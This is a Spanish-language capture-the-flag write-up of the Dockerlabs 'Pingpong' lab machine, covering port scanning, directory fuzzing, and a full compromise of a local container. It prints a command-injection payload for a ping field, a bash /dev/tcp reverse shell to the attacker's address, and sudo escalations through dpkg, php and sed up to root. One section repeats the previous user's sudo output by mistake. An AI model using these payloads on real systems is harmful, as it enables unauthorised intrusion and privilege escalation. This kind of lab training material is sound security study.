
# Writeup Template: Maquina `[ Pingpong ]`

- Tags: #Pingpong
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina PingPong](https://mega.nz/file/4GtWBbQZ#HMo12GRIHABDnyRK2mO_AKuFhPrMO-oXO7hLQpmyadA)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x pingpong.zip
sudo bash auto_deploy.sh pingpong.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80,443,5000 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp   open  http     Apache httpd 2.4.58 ((UbuntuNoble))
443/tcp  open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
5000/tcp open  http     Werkzeug httpd 3.0.1 (Python 3.12.3)
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.02
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada relevante

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10671]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/
/machine.php          (Status: 200) [Size: 6989]
```

Tenemos esta url
```bash
http://172.17.0.2/machine.php
```

Fuzzeando si existen parametros no tuvimos nada:
```bash
wfuzz -c --hw 31 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/machine.php\?FUZZ\=whoami"
```

## Enumeracion de [Servicio Web 443]
```bash
https://172.17.0.2/
```

Fuzzeamos por direcctorios:
```bash
gobuster dir -u https://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash -k
```

Fuzzeamos por archivos:
```bash
gobuster dir -u https://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,php,backup,txt,sh,html -k
```

Resulato es el mismo que en la url anterior:
```bash
/index.html           (Status: 200) [Size: 10671]
/javascript           (Status: 301) [Size: 315] [--> https://172.17.0.2/javascript/]
/machine.php          (Status: 200) [Size: 6989]
```

## Enumeracion de [Servicio Web 5000]
Tenemos la web en este puerto:
```bash
http://172.17.0.2:5000/
```

## Explotacion de Vulnerabilidades
### Ejecucion del Ataque
En el campo nos permite realizar un **ping** a una direccion **ip** 
Ahora si no esta sanitizada podemos colarle un comando aparte de la siguiente manera:
```bash
172.17.0.2 && id
```

Respuesta:
```bash
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.039 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.062 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.051 ms

--- 172.17.0.2 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3066ms
rtt min/avg/max/mdev = 0.032/0.046/0.062/0.011 ms
uid=1001(freddy) gid=1001(freddy) groups=1001(freddy) # Output de nuestro comando ( id )
```

---
### Vector de Ataque
Ahora sabemos que el servicio esta siendo ejeuctando por un usuario: **( freddy )**
Nos aprovehcamos de esto para enviarnos una **reverShell** para ganar accesso a la maquina, Nos ponemos en escucha
### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
172.17.0.2 && bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
Buscamos en los directorios por archivos:
```bash
# Comandos clave ejecutados
find . -type f 2>/dev/null
```

**Hallazgos Clave:**
	No obutivimos nada relevante
### Explotacion de Privilegios

###### Usuario `[ Freddy ]`:
Listando los permisos de este usuario:
```bash
sudo -l

User freddy may run the following commands on a2727baaa416:
    (bobby) NOPASSWD: /usr/bin/dpkg # Tenemos una via potencial de migrar a este usuario
```

Explotando privilegio
```bash
# Comando para escalar al usuario: ( bobby )
sudo -u bobby /usr/bin/dpkg -l # Primero este
!/bin/bash # Despues este
```

###### Usuario `[ bobby ]`:
Listando los permisos del usuario
```bash
sudo -l

User bobby may run the following commands on a2727baaa416:
    (gladys) NOPASSWD: /usr/bin/php # Tenemos una via potencial de migrar a este usuario
```

Explotando privilegio:
```bash
# comando para escalar al usuario: (gladys  )
sudo -u gladys /usr/bin/php -r "system('/bin/bash');"
```

###### Usuario `[ Gladys ]`:
Listando los permisos del usuario
```bash
sudo -l

User bobby may run the following commands on a2727baaa416:
    (gladys) NOPASSWD: /usr/bin/php # Tenemos una via potencial de migrar a este usuario
```

Explotando privilegio:
```bash
# comando para escalar al usuario: (gladys  )
sudo -u gladys /usr/bin/php -r "system('/bin/bash');"
```

Ahora usamos este comando para escalar a **root**
```bash
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
whoami
root
```

---